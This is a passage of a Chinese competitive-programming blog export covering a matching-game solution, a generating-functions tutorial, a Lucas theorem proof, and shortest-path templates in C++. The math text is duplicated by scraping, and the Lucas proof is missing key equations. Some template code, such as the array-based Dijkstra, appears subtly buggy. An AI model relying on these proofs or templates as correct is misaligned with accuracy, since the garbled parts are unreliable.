MAXM];struct Edge &#123; int t, next;&#125; edge[MAXM * MAXN];int head[MAXN * MAXM], cnt, tot, pre[MAXN * MAXM];int dx[5] = &#123;0, 1, 0, 0, -1&#125;;int dy[5] = &#123;0, 0, -1, 1, 0&#125;;inline void add(int u, int v) &#123; cnt++; edge[cnt].t = v; edge[cnt].next = head[u]; head[u] = cnt;&#125;void color(int u, int c) &#123; if (co[u]) return; co[u] = c; //DEBUG(u); for (int e = head[u]; e; e = edge[e].next) &#123; int v = edge[e].t; color(v, 3 - c); &#125;&#125;bool dfs1(int u) &#123; for (int e = head[u]; e; e = edge[e].next) &#123; int v = edge[e].t; if (!vis[v]) &#123; vis[v] = true; if (!pre[v] || dfs1(pre[v])) &#123; pre[v] = u; return true; &#125; &#125; &#125; return false;&#125;void dfs2(int u) &#123; if (ans[u]) return; ans[u] = true; for (int e = head[u]; e; e = edge[e].next) &#123; int t = edge[e].t; if (pre[t]) &#123; ans[u] = true; dfs2(pre[t]); &#125; &#125;&#125;int main(int argc, char *argv[]) &#123; scanf("%d %d", &amp;n, &amp;m); for (int i = 1; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= m; j++) &#123; char ch; std::cin &gt;&gt; ch; if(ch == '.') f[i][j] = ++tot; &#125; &#125; for (int i = 1; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= m; j++) &#123; if (!f[i][j]) continue; for (int k = 1; k &lt;= 4; k++) &#123; int xx = i + dx[k]; int yy = j + dy[k]; if (f[xx][yy] &amp;&amp; xx &gt;= 1 &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= 1 &amp;&amp; yy &lt;= m) &#123; add(f[i][j], f[xx][yy]); &#125; &#125; &#125; &#125; for (int i = 1; i &lt;= tot; i++) &#123; if (!co[i]) color(i, 1); &#125; int count = 0; for (int i = 1; i &lt;= tot; i++) &#123; if (co[i] == 1) &#123; memset(vis, 0, sizeof(vis)); count += dfs1(i); &#125; &#125; if (count * 2 == tot) return puts("LOSE"), 0; printf("WIN\n"); for (int i = 1; i &lt;= tot; i++) &#123; if (pre[i]) pre[pre[i]] = i; &#125; for (int i = 1; i &lt;= tot; i++) &#123; if (!pre[i]) dfs2(i); &#125; for (int i = 1; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= m; j++) &#123; if(ans[f[i][j]]) printf("%d %d\n", i, j); &#125; &#125; return 0;&#125;注意！此程序在洛谷交会RE!!!! 题目中给出 0≤n≤1000\le n \le 1000≤n≤100，程序中我定义到了100+7100+7100+7 可能由于数据有锅，我 nnn 开到 200+7200 + 7200+7 就可以AC了qwqReal AC Code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#define DEBUG(x) std::cerr &lt;&lt; #x &lt;&lt; " = " &lt;&lt; x &lt;&lt; std::endlconst int MAXN = 200 + 7;const int MAXM = 200 + 7;int n, m;int f[MAXN][MAXM], co[MAXN * MAXM];bool ans[MAXN * MAXM], vis[MAXN * MAXM];struct Edge &#123; int t, next;&#125; edge[MAXM * MAXN];int head[MAXN * MAXM], cnt, tot, pre[MAXN * MAXM];int dx[5] = &#123;0, 1, 0, 0, -1&#125;;int dy[5] = &#123;0, 0, -1, 1, 0&#125;;inline void add(int u, int v) &#123; cnt++; edge[cnt].t = v; edge[cnt].next = head[u]; head[u] = cnt;&#125;void color(int u, int c) &#123; if (co[u]) return; co[u] = c; //DEBUG(u); for (int e = head[u]; e; e = edge[e].next) &#123; int v = edge[e].t; color(v, 3 - c); &#125;&#125;bool dfs1(int u) &#123; for (int e = head[u]; e; e = edge[e].next) &#123; int v = edge[e].t; if (!vis[v]) &#123; vis[v] = true; if (!pre[v] || dfs1(pre[v])) &#123; pre[v] = u; return true; &#125; &#125; &#125; return false;&#125;void dfs2(int u) &#123; if (ans[u]) return; ans[u] = true; for (int e = head[u]; e; e = edge[e].next) &#123; int t = edge[e].t; if (pre[t]) &#123; ans[u] = true; dfs2(pre[t]); &#125; &#125;&#125;int main(int argc, char *argv[]) &#123; scanf("%d %d", &amp;n, &amp;m); for (int i = 1; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= m; j++) &#123; char ch; std::cin &gt;&gt; ch; if(ch == '.') f[i][j] = ++tot; &#125; &#125; for (int i = 1; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= m; j++) &#123; if (!f[i][j]) continue; for (int k = 1; k &lt;= 4; k++) &#123; int xx = i + dx[k]; int yy = j + dy[k]; if (f[xx][yy] &amp;&amp; xx &gt;= 1 &amp;&amp; xx &lt;= n &amp;&amp; yy &gt;= 1 &amp;&amp; yy &lt;= m) &#123; add(f[i][j], f[xx][yy]); &#125; &#125; &#125; &#125; for (int i = 1; i &lt;= tot; i++) &#123; if (!co[i]) color(i, 1); &#125; int count = 0; for (int i = 1; i &lt;= tot; i++) &#123; if (co[i] == 1) &#123; memset(vis, 0, sizeof(vis)); count += dfs1(i); &#125; &#125; if (count * 2 == tot) return puts("LOSE"), 0; printf("WIN\n"); for (int i = 1; i &lt;= tot; i++) &#123; if (pre[i]) pre[pre[i]] = i; &#125; for (int i = 1; i &lt;= tot; i++) &#123; if (!pre[i]) dfs2(i); &#125; for (int i = 1; i &lt;= n; i++) &#123; for (int j = 1; j &lt;= m; j++) &#123; if(ans[f[i][j]]) printf("%d %d\n", i, j); &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>二分图</tag>
        <tag>网络流</tag>
        <tag>二分图最大匹配</tag>
        <tag>JSOI</tag>
        <tag>染色</tag>
        <tag>博弈论</tag>
        <tag>增广路</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数论」生成函数的毒瘤操作]]></title>
    <url>%2Farticles%2F%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[食用指南阅读此文需要准备 打草纸 和 笔!从前有一个无限长的随便一个数列 a={2,1,4,7,4}a = \{2, 1, 4, 7, 4\}a={2,1,4,7,4}有一天，一个dalao说：能不能用一个函数表示这个数列呢？于是dalao把 aaa 的每一项当做一个多项式的系数，得到了多项式函数 f(x)=2+x+4x2+7x3+4x4f(x) = 2 + x + 4x^2 + 7x^3 + 4x^4f(x)=2+x+4x​2​​+7x​3​​+4x​4​​，用来表示上面那个序列dalao的朋友——蒟蒻感到疑惑：这个函数代入一个 xxx ，得到的东西有什么意义啊？dalao思考了一会，说：也没什么意义。蒟蒻：那你研究它有个*儿用？dalao又思考了一会，找到了它的一种用途。假如数列 aaa 代表一类物品，中 aia_ia​i​​ 表示这类物品中选 iii 件物品的方案数——例如 a={1,1,1}a = \{1, 1, 1\}a={1,1,1} 表示A类物品中可以选 000 件或 111 件或 222 件，但不能选大于 222 件；又例如无限长数列 b={1,0,0,1,0,0,1,0,0,1...}b = \{1, 0, 0, 1, 0, 0, 1, 0, 0, 1...\}b={1,0,0,1,0,0,1,0,0,1...} 表示 BBB 类物品只能选 333 的倍数件。这时候，把 f(x)=1+x+x2f(x) = 1 + x + x^2f(x)=1+x+x​2​​ 和 g(x)=1+x3+x6+x9⋯g(x) = 1 + x^3 + x^6 + x^9 \cdotsg(x)=1+x​3​​+x​6​​+x​9​​⋯ 乘起来，得到另一个函数 h(x)=1+x+x2+x3+x4+⋯h(x) = 1 + x + x^2 + x^3 + x^4 + \cdotsh(x)=1+x+x​2​​+x​3​​+x​4​​+⋯ 这个函数有什么意义呢？它的第 iii 项的系数就是选 A,BA,BA,B 两种物品共 iii 件的方案数。蒟蒻：这有啥，不就是把两个多项式乘起来么？和 O(n2)O(n^2)O(n​2​​) 一个个枚举有什么区别？dalao：嗯……你可以 FFTFFTFFT ……蒟蒻：哦。没有这个函数我也知道可以 FFTFFTFFT 。dalao不认为这个“用函数表示数列”的东西很没用，他决定继续研究，还给它取了个名字叫做数列的“生成函数”，表示用这个函数能生成（表示）一个数列。有一天，dalao告诉蒟蒻他发现了一个规律—— a={1,1,1,1,1...}a = \{1, 1, 1, 1, 1...\}a={1,1,1,1,1...} 的生成函数是 f(x)=11−xf(x) = \frac{1}{1 - x}f(x)=​1−x​​1​​蒟蒻：老哥，您不会是研究数学研究傻了吧？它的生成函数不是 1+x+x2+x3⋯1 + x + x^2 + x^3\cdots1+x+x​2​​+x​3​​⋯ 嘛？怎么会等于您这个 11−x\frac{1}{1 - x}​1−x​​1​​ 呢？dalao：对啊！ 1+x+x2+x3⋯1 + x + x^2 + x^3\cdots1+x+x​2​​+x​3​​⋯ 就等于 11−x\frac{1}{1 - x}​1−x​​1​​ ！蒟蒻：喂，临沂市第四人民医院嘛？dalao：……在 x∈(−1,1)x\in (-1, 1)x∈(−1,1) 的时候。蒟蒻：你不早说！等等，为什么 x∈(−1,1)x\in (-1, 1)x∈(−1,1) 时就相等了？dalao：等比数列求和公式啊，1+x+x2+x3⋯1 + x + x^2 + x^3\cdots1+x+x​2​​+x​3​​⋯ 的前n项和等于 1−xn1−x\frac{1 - x^n}{1 - x}​1−x​​1−x​n​​​​ ，这是个无限长的数列，nnn 趋近于无穷的时候 xnx^nx​n​​ 趋近于 000 ，这不就相等了嘛！蒟蒻：啊，对啊！可是好好的一个函数，你凭空给限定了定义域，这还是原来那个函数嘛？dalao：不是你说的生成函数中的x没有意义嘛！还有，你看 1+x2+x4+x6⋯1 + x^2 + x^4 + x^6\cdots1+x​2​​+x​4​​+x​6​​⋯ 这个函数，它是不是等于 11−x2\frac{1}{1-x^2}​1−x​2​​​​1​​ ？蒟蒻：对，把前一个式子中的 xxx 换成 x2x^2x​2​​ 不就好了嘛！可是 1+2x+3x2+4x3⋯1 + 2x + 3x^2 + 4x^3\cdots1+2x+3x​2​​+4x​3​​⋯ 这个函数，它等于什么？dalao：等于 1(1−x)2\frac{1}{(1 - x)^2}​(1−x)​2​​​​1​​ 啊！你看，对等式 11−x=1+x+x2+x3⋯\frac{1}{1 - x} = 1 + x + x^2 + x^3\cdots​1−x​​1​​=1+x+x​2​​+x​3​​⋯ 两边分别求导，得到……算了，说了你也不懂，那你把两个 1+x+x2+x3⋯1 + x + x^2 + x^3\cdots1+x+x​2​​+x​3​​⋯ 乘起来不就好了嘛！蒟蒻：蛤？我看看……的确诶！dalao：我还知道 1+3x+6x2+10x3+15x4⋯1 + 3x + 6x^2 + 10x^3 + 15x^4\cdots1+3x+6x​2​​+10x​3​​+15x​4​​⋯ 的生成函数是多少呢！是 1(1−x)3\frac{1}{(1-x)^3}​(1−x)​3​​​​1​​ ！推广开来，1(1−x)k\frac{1}{(1 - x)^k}​(1−x)​k​​​​1​​ 生成的数列是∑i∞Ci+k−1k−1xi\sum_{i}^\infty C_{i + k - 1}^{k - 1} x^i​i​∑​∞​​C​i+k−1​k−1​​x​i​​蒟蒻：为什么啊？dalao：你看 就是个 相乘，就是 kkk 个 1+x+x2+x3...1 + x + x^2 + x^3...1+x+x​2​​+x​3​​... 相乘嘛。那么它的第 iii 项系数就是从 kkk 个 1+x+x2+x3...1 + x + x^2 + x^3...1+x+x​2​​+x​3​​... 中每个选出一项，乘起来恰为 xix^ix​i​​ 的方案数，就是 i=x1+x2+...+xki = x_1 + x_2 + ... + x_ki=x​1​​+x​2​​+...+x​k​​ 的非负整数解的组数，你用组合数学中的所谓隔板法求一下，是不是 Ci+k−1k−1C_{i + k - 1}^{k - 1}C​i+k−1​k−1​​ ？蒟蒻：有道理！dalao：了解了 和 这两种特殊生成函数，就掌握了一类题的技巧——来做道题吧！Luogu P2000 欢迎你！dalao：我还会用生成函数求斐波那契数列通项！蒟蒻：这么牛逼？dalao：首先啊，你看这个斐波那契数列的生成函数 f(x)=x+x2+2x3+3x4+5x5+8x6...f(x) = x + x^2 + 2x^3 + 3x^4 + 5x^5 + 8x^6...f(x)=x+x​2​​+2x​3​​+3x​4​​+5x​5​​+8x​6​​...，然后把它乘个 xxx ，得x⋅f(x)=x2+x3+2x4+3x5+5x6+8x7...x\cdot f(x) = x^2 + x^3 + 2x^4 + 3x^5 + 5x^6 + 8x^7...x⋅f(x)=x​2​​+x​3​​+2x​4​​+3x​5​​+5x​6​​+8x​7​​...用前式减去后式，得到f(x)−x⋅f(x)=x+x3+x4+2x5+3x6+5x7...=x+x2⋅f(x)f(x) - x \cdot f(x) = x + x ^ 3 + x^4 + 2x^5 + 3x^6 + 5x^7... = x + x^2 \cdot f(x)f(x)−x⋅f(x)=x+x​3​​+x​4​​+2x​5​​+3x​6​​+5x​7​​...=x+x​2​​⋅f(x)所以f(x)=x1−x−x2f(x) = \frac{x}{1 - x - x^2}f(x)=​1−x−x​2​​​​x​​蒟蒻：可是这不是我们之前见过的那两种特殊生成函数，你怎么把它还原成数列呢？dalao：我打算把它变成等比数列求和的形式！这个分母 1−x−x21-x-x^21−x−x​2​​ 是可以因式分解的，分解后就是(1−1−52x)(1−1+52x)(1-\frac{1-\sqrt5}{2}x)(1-\frac{1+\sqrt5}{2}x)(1−​2​​1−√​5​​​​​x)(1−​2​​1+√​5​​​​​x)所以x1−x−x2=x(1−1−52x)(1−1+52x)\frac{x}{1 - x - x^2} = \frac{x}{(1-\frac{1-\sqrt5}{2}x)(1-\frac{1+\sqrt5}{2}x)}​1−x−x​2​​​​x​​=​(1−​2​​1−√​5​​​​​x)(1−​2​​1+√​5​​​​​x)​​x​​看着非常难受，裂项一下，得到x(1−1−52x)(1−1+52x)=−151(1−1−52x)+151(1−1+52x)\frac{x}{(1-\frac{1-\sqrt5}{2}x)(1-\frac{1+\sqrt5}{2}x)} = -\frac{1}{\sqrt5}\frac{1}{(1-\frac{1-\sqrt5}{2}x)} + \frac{1}{\sqrt5}\frac{1}{(1-\frac{1+\sqrt5}{2}x)}​(1−​2​​1−√​5​​​​​x)(1−​2​​1+√​5​​​​​x)​​x​​=−​√​5​​​​​1​​​(1−​2​​1−√​5​​​​​x)​​1​​+​√​5​​​​​1​​​(1−​2​​1+√​5​​​​​x)​​1​​这就成了两个等比数列求和公式乘个常数再相加的形式了！把两个等比数列还原成数列，得到fibn=−15(1−52)n+15(1+52)nfib_n = -\frac{1}{\sqrt5}(\frac{1-\sqrt5}{2})^n + \frac{1}{\sqrt5}(\frac{1+\sqrt5}{2})^nfib​n​​=−​√​5​​​​​1​​(​2​​1−√​5​​​​​)​n​​+​√​5​​​​​1​​(​2​​1+√​5​​​​​)​n​​这就是斐波那契数列通项公式了！蒟蒻：哇！这么神奇！dalao：据说这种方法可以应用到各种线性齐次递推中哦～就写到这里吧qwq]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>FFT</tag>
        <tag>教程</tag>
        <tag>毒瘤</tag>
        <tag>乱搞</tag>
        <tag>函数</tag>
        <tag>生成函数</tag>
        <tag>快速傅里叶变换</tag>
        <tag>NTT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数论」Lucas定理]]></title>
    <url>%2Farticles%2FLucas%2F</url>
    <content type="text"><![CDATA[这里我们来介绍一下Lucas定理w设 ppp 为素数, aaa , bbb ∈N+\in N_+∈N​+​​且a=akpk+ak−1pk−1+⋯+a1p+a0a=aa=a_kp^k+a_{k-1}p^{k-1}+\cdots+a_1p+a_0a=aa=a​k​​p​k​​+a​k−1​​p​k−1​​+⋯+a​1​​p+a​0​​a=ab=bkpk+bk−1pk−1+⋯+b1p+b0b=bb=b_kp^k+b_{k-1}p^{k-1}+\cdots+b_1p+b_0b=bb=b​k​​p​k​​+b​k−1​​p​k−1​​+⋯+b​1​​p+b​0​​b=b这里0≤ai,bi≤p−1⋀ai,bi∈Z(i=0,1,2,3,⋯,k)0≤a0\leq a_i,b_i\leq p-1\bigwedge a_i,b_i\in Z(i=0,1,2,3,\cdots,k)0 \leq a0≤a​i​​,b​i​​≤p−1⋀a​i​​,b​i​​∈Z(i=0,1,2,3,⋯,k)0≤a则有：等价形式 由于有又因为 a0&lt;pa_0&lt;pa​0​​&lt;p ，故同理故又因为 a0&lt;pa_0 &lt; pa​0​​&lt;p ，故⌊ap⌋=akpk−1+ak−1pk−2+⋯+a1\lfloor{\frac{a}{p}}\rfloor=a_kp^{k-1}+a_{k-1}p^{k-2}+\cdots+a_1⌊​p​​a​​⌋=a​k​​p​k−1​​+a​k−1​​p​k−2​​+⋯+a​1​​同理⌊bp⌋=bkpk−1+bk−1pk−2+⋯+b1\lfloor{\frac{b}{p}}\rfloor=b_kp^{k-1}+b_{k-1}p^{k-2}+\cdots+b_1⌊​p​​b​​⌋=b​k​​p​k−1​​+b​k−1​​p​k−2​​+⋯+b​1​​故C⌊bp⌋⌊ap⌋=Cakbk×Cak−1bk−1×⋯×Ca1b1C^{\lfloor\frac{a}{p}\rfloor}_{\lfloor\frac{b}{p}\rfloor}=C^{b_k}_{a_k}\times C^{b_{k-1}}_{a_{k-1}}\times\cdots\times C^{b_1}_{a_1}C​⌊​p​​b​​⌋​⌊​p​​a​​⌋​​=C​a​k​​​b​k​​​​×C​a​k−1​​​b​k−1​​​​×⋯×C​a​1​​​b​1​​​​故我们真正要用的，就是证明对于素数 nnn 和 mmm ，满足 1≤m≤n−11\le m\le n-11≤m≤n−1 , 二项式系数 Cnm=n!(n−m)!⋅m!=n(n−1)⋯(n−m+1)m(m−1)⋯1C^m_n=\frac{n!}{(n-m)!\cdot m!}=\frac{n(n-1)\cdots(n-m+1)}{m(m-1)\cdots1}C​n​m​​=​(n−m)!⋅m!​​n!​​=​m(m−1)⋯1​​n(n−1)⋯(n−m+1)​​ 可被 nnn 整除。由此可得，在母函数中对于非负整数 iii ，若对于 i≤t(t≥1)i\le t(t\ge 1)i≤t(t≥1) 时成立，则有(1+x)pt+1=(1+x)pt×p=((1+x)pt)p=1+xp×pt=1+xpt+1(1+x)^{p^{t+1}}=(1+x)^{p^{t}\times p}=((1+x)^{p^t})^p=1+x^{p\times p^t}=1+x^{p^{t+1}}(1+x)​p​t+1​​​​=(1+x)​p​t​​×p​​=((1+x)​p​t​​​​)​p​​=1+x​p×p​t​​​​=1+x​p​t+1​​​​对于任意非负整数 iii ，都有故对于任意非负整数 mmm 和素数 ppp ，将 mmm 用 ppp 进制表示，即m=∑i=0kmipi,m=\sum _{i=0}^{k}m_{i}p^{i},m=​i=0​∑​k​​m​i​​p​i​​,其中 k∈N+k\in N_+k∈N​+​​ 、 mim_im​i​​ 为整数且 0≤mi≤p−10\le m_i\le p-10≤m​i​​≤p−1 。注意到其中 nin_in​i​​ 是 nnn 的 ppp 进制表达的第 iii 位。此即证明了本定理Code :123456789101112131415161718192021222324252627282930#include &lt;cstdio&gt;long long exp_mod (long long a, long long b, long long p) &#123; long long res = 1; while(b) &#123; (b &amp; 1) &amp;&amp; (res = (res * a) % p); a = (a * a) % p; b &gt;&gt;= 1; &#125; return res;&#125;long long Comb (long long a, long long b, long long p) &#123; if(a &lt; b) return 0; if(a == b) return 1; (b &gt; a - b) &amp;&amp; (b = a - b); long long ans = 1, ca = 1, cb = 1; for(register long long i = 0; i &lt; b; ++i) &#123;ca = (ca * (a - i))%p; cb = (cb * (b - i))%p;&#125; ans = (ca * exp_mod(cb, p - 2, p)) % p; return ans;&#125;long long Lucas (short n, short m, int p) &#123; long long ans = 1; while(n &amp;&amp; m &amp;&amp; ans) &#123;ans = (ans * Comb(n % p, m % p, p)) % p; n /= p; m /= p;&#125; return ans;&#125;int main() &#123; short n, m; int p; scanf("%hd", &amp;n); while(~scanf("%hd%hd%d", &amp;n, &amp;m, &amp;p)) printf("%lld\n", Lucas(n + m, m, p)); return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>教程</tag>
        <tag>卢卡斯定理</tag>
        <tag>Lucas</tag>
        <tag>模版</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「图论」最短路模版]]></title>
    <url>%2Farticles%2Fdijkstra-spfa%2F</url>
    <content type="text"><![CDATA[求最短路是图论中的一项基本操作最短路模版题目: Heat Wave (大水题?本文介绍一下几种最短路算法 （其实之前写过，只不过太毒瘤了qwq题目描述注: Shq已优化题面德克萨斯纯朴的民眾们这个夏天正在遭受巨大的热浪！！！他们的德克萨斯长角牛吃起来不错，可是他们并不是很擅长生產富含奶油的乳製品。FarmerJohnFarmer\;JohnFarmerJohn 此时以先天下之忧而忧，后天下之乐而乐的精神，身先士卒地承担起向德克萨斯运送大量的营养冰凉的牛奶的重任，以减轻德克萨斯人忍受酷暑的痛苦。FJFJFJ 已经研究过可以把牛奶从威斯康星运送到德克萨斯州的路线。这些路线包括起始点和终点先一共经过T(1≤T≤2,500)T (1 \le T \le 2,500)T(1≤T≤2,500)个城镇，方便地标号為 111 到 TTT 。除了起点和终点外地每个城镇由两条双向道路连向至少两个其它地城镇。每条道路有一个通过费用（包括油费，过路费等等）。给定一个地图，包含 C(1≤C≤6,200)C (1 \le C \le 6,200)C(1≤C≤6,200) 条直接连接 222 个城镇的道路。每条道路由道路的起点 RsRsRs ，终点 ReReRe (1≤Rs≤T;1≤Re≤T)(1 \le Rs \le T; 1 \le Re \le T)(1≤Rs≤T;1≤Re≤T) ，和花费 (1≤Ci≤1,000)(1 \le Ci \le 1,000)(1≤Ci≤1,000) 组成。求从起始的城镇 Ts(1≤Ts≤T)Ts (1 \le Ts \le T)Ts(1≤Ts≤T) 到终点的城镇 Te(1≤Te≤T)Te(1 \le Te \le T)Te(1≤Te≤T) 最小的总费用。简化版本:给定一个无向图，求 S 点到 T 点的最短路径对于这道题目，我们可以使用图论中的最短路算法DijkstraBellman-FordSPFAFloydDijkstraDijkstra的算法流程：初始化每个点的 distdistdist 为 000，其余节点的 distdistdist 为 INFINFINF (0x3f0\text {x}3f0x3f)找到一个没有被标记的，distdistdist 最小的节点 vvv , 然后标记节点 vvv扫描节点 vvv 的所有出边 (from,to,d)(from,\;to,\;d)(from,to,d) , 若 distto&gt;distfrom+ddist_{to} &gt; dist_{from} + ddist​to​​&gt;dist​from​​+d 则用 distfrom+ddist_{from} + ddist​from​​+d 更新 disttodist_{to}dist​to​​重复 222 和 333 直到所有点被标记Dijkstra基于贪心思想qwq，她只适用于长度非负数的图朴素的Dijkstra的时间复杂度为 O(mn)O(mn)O(mn) 带堆优化的Dijkstra的时间复杂度为 O(mlogn)O(m\log n)O(mlogn)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// 指针qwq#include &lt;functional&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;set&gt;#define DEBUG(x) cerr &lt;&lt; #x &lt;&lt; '=' &lt;&lt; x &lt;&lt; endlconst int MAXN = 2500 + 5;struct Node;struct Edge;class Node &#123;public: int dist; bool used; // 用于维护Dijkstra Edge *firstEdge;&#125; node[MAXN];class Edge &#123;public: Node *s,*t; int w; Edge *next; Edge (Node *s, Node *t, int w) : s(s), t(t), w(w), next(s-&gt;firstEdge) &#123;&#125;&#125;;inline void add (const int &amp;s, const int &amp;t, const int &amp;w) &#123; node[s].firstEdge = new Edge(&amp;node[s], &amp;node[t], w); node[t].firstEdge = new Edge(&amp;node[t], &amp;node[s], w);&#125;inline void init (const int &amp;n) &#123; for(int i = 1; i &lt;= n; i++)&#123; node[i].dist = 0x3f3f3f; node[i].used = false; &#125;&#125;int dijkstra(const int &amp;s,const int &amp;t,const int &amp;n)&#123; init (n); std::priority_queue&lt;std::pair&lt;int, Node*&gt;, std::vector&lt;std::pair&lt;int, Node*&gt; &gt;, std::greater&lt;std::pair&lt;int, Node*&gt; &gt; &gt; q; q.push(std::make_pair(node[s].dist = 0, &amp;node[s])); while(!q.empty()) &#123; Node *v = q.top().second; q.pop(); if(v-&gt;used) continue; v-&gt;used = true; for(Edge *is = v-&gt;firstEdge; is; is = is-&gt;next)&#123; if(is-&gt;t-&gt;dist &gt; v-&gt;dist + is-&gt;w)&#123; is-&gt;t-&gt;dist = v-&gt;dist + is-&gt;w; q.push(std::make_pair(is-&gt;t-&gt;dist, is-&gt;t)); &#125; &#125; &#125; return node[t].dist;&#125;int main(int argc, char const *argv[]) &#123; int n, m, s, t; scanf("%d%d%d%d", &amp;n, &amp;m, &amp;s, &amp;t); for(int i = 1; i &lt;= m; i++)&#123; int u, v, w; scanf("%d%d%d", &amp;u, &amp;v, &amp;w); add(u, v, w); &#125; printf("%d", dijkstra(s, t, n)); return 0;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//数组qwq#include &lt;functional&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;set&gt;const int MAXM = 6200 + 5;const int MAXN = 2500 + 5;struct Edge&#123; int v,next,w;&#125;edge[MAXM * 2];int firstEdge[MAXN];int dist[MAXN];bool inQueue[MAXN];int cnt;inline void add(int u,int v,int w)&#123; edge[++cnt].v = v; edge[cnt].w = w; edge[cnt].next = firstEdge[u]; firstEdge[u] = cnt;&#125;inline int dijkstra(int s,int t,int n)&#123; for(int i = 1;i &lt;= n;i++) dist[i] = INT_MAX; std::priority_queue&lt;std::pair&lt;int,int&gt;,std::vector&lt;std::pair&lt;int,int&gt; &gt;,std::greater&lt;std::pair&lt;int,int&gt; &gt; &gt; q; inQueue[s] = true; q.push(std::make_pair(s,0)); dist[s] = 0; while(!q.empty())&#123; int v = q.top().first; int value = q.top().second; q.pop(); for(int e = firstEdge[v]; e;e = edge[e].next)&#123; //int to = edge[i].v; if(dist[edge[e].v] &gt; value + edge[e].w)&#123; dist[edge[e].v] = value + edge[e].w; q.push(std::make_pair(edge[e].v,dist[edge[e].v])); &#125; &#125; &#125; return dist[t];&#125;int main(int argc, char *const argv[])&#123; int n,m,s,t; scanf("%d%d%d%d",&amp;n,&amp;m,&amp;s,&amp;t); for(int i = 1;i &lt;= m;i++)&#123; int s,t,w; scanf("%d%d%d",&amp;s,&amp;t,&amp;w); add(s,t,w); add(t,s,w); &#125; printf("%d",dijkstra(s,t,n)); return 0;&#125;Bellman-Ford对于每一条边 edgeedgeedge，如果 distfrom+d&lt;disttodist_{from}+d&lt;dist_{to}dist​from​​+d&lt;dist​to​​，则令 distto=distfrom+ddist_{to}=dist_{from}+ddist​to​​=dist​from​​+d 。若上述操作没有对distdistdist进行更新，说明最短路径已经查找完毕，或者部分点不可达，跳出循环。否则执行下次循环显然的 Bellman-Ford\text {Bellman-Ford}Bellman-Ford的时间复杂度为 O(mn)O(mn)O(mn)origin[i]表示编号为i这条边的起点编号， destination[i]表示编号为i这条边的终点编号， value[i]表示编号为i这条边的权值，1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;int dis[10010];int origin[10010],destination[10010],value[10010];//刚刚说过的三个数组int n,m;void Bellman_ford(int a) &#123; memset(dis, 0x3f, sizeof (dis));//赋初始值 dis[a] = 0; for(int i = 1; i &lt;= n - 1; i++) //更新n - 1次 for(int j = 1; j &lt;= m; j++) //更新每一条边 dis[destination[j]] = min (dis[destination[j]], dis[origin[j]] + value[j]); //判断是否更新&#125; int main(int argc, char *const argv[]) &#123; std::cin &gt;&gt; n &gt;&gt; m; for(int i = 1; i &lt;= m; i++) std::cin &gt;&gt; origin[i] &gt;&gt; destination[i] &gt;&gt; value[i]; Bellman_ford (1); for(int i = 1; i &lt;= n; i++) std::cout &lt;&lt; dis[i] &lt;&lt; " "; &#125;SPFA一天，你在一次模拟赛中看到了一道最短路的题目，你兴奋地敲上了Ford算法然后......TLE * 20 猝死为什么我们的Ford那么慢呢?我们看到Ford算法中的扫描，会发现，这个算法真是无脑....多了很多不需要拓展节点的冗余扫描...于是，我们就可以开敲了...Tips: SPFA算法在国际上称作 &quot;队列优化的Bellman-Ford算法&quot;SPFA 也仅仅是在中国大陆地区流转...SPFA 的正确读法有待考究....Code:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// 数组qwq#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;climits&gt;#include &lt;queue&gt;const int MAXM = 6200 + 5;const int MAXN = 2500 + 5;struct Edge&#123; int v,next,value;&#125;edge[MAXM * 2];//双向边开2倍int firstEdge[MAXN];int cnt;int dist[MAXN];bool inQueue[MAXN];inline void add(int u,int v,int w)&#123; edge[++cnt].v = v; edge[cnt].next = firstEdge[u]; edge[cnt].value = w; firstEdge[u] = cnt;&#125;inline int spfa(int s,int t,int n)&#123; for(int i = 1;i &lt;= n;i++) dist[i] = INT_MAX; dist[s] = 0; inQueue[s] = true; std::queue&lt;int&gt; q; q.push(s); while(!q.empty())&#123; int v = q.front(); q.pop(); inQueue[v] = false; for(int e = firstEdge[v];e;e = edge[e].next)&#123; if(dist[edge[e].v] &gt; dist[v] + edge[e].value)&#123; dist[edge[e].v] = dist[v] + edge[e].value; if(!inQueue[edge[e].v])&#123; q.push(edge[e].v); inQueue[edge[e].v] = true; &#125; &#125; &#125; &#125; return dist[t];&#125;int main(int argc, char *const argv[])&#123; int n, m, s, t; scanf("%d%d%d%d", &amp;n, &amp;m, &amp;s, &amp;t); for(int i = 1;i &lt;= m;i++)&#123; int s,t,w; scanf("%d%d%d",&amp;s,&amp;t,&amp;w); add(s,t,w); add(t,s,w); &#125; printf("%d",spfa(s,t,n)); return 